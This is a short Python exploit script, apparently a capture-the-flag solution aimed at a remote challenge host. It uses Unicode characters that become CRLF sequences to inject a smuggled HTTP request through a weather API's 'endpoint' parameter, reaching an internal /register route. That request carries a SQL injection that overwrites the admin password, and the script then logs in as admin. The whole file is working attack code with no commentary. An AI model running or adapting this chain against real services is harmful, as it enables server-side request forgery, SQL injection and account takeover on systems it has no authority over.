import requests
from requests.sessions import PreparedRequest
import urllib.parse

#TARGET_URL="http://localhost:1337"
TARGET_URL="http://188.166.169.77:30126"

def prepare(str):
    str=str.replace(" ","Ġ")
    str=str.replace("\n","čĊ")
    return str
def urlencode(str):
    str=urllib.parse.quote(str)
    return str
def smuggle(ip_given):
    username="admin"
    password="') ON CONFLICT(username) DO UPDATE SET password='test';--"
    username=urlencode(username)
    password=urlencode(password)
    content="username={username}&password={password}".format(username=username, password=password)
    content_len=len(content)
    endpoint=("{ip}/ HTTP/1.1\n"
              "Host: {ip}\n"
              "\n"
              "POST /register HTTP/1.1\n"
              "Host: {ip}\n"
              "Content-Type: application/x-www-form-urlencoded\n"
              "Content-Length: {cl}\n"
              "\n"
              "{content}\n"
              "\n" 
              "GET /?a").format(ip=ip_given, content=content, cl=content_len)
    endpoint=prepare(endpoint)
    res=requests.post(TARGET_URL+'/api/weather', json={'endpoint': endpoint, 'city': 'Delhi', 'country': 'IN'})
    print(res.text)
    res=requests.post(TARGET_URL+"/login", json={'username':'admin', 'password':'test'})
    print(res.text)

smuggle("127.0.0.1")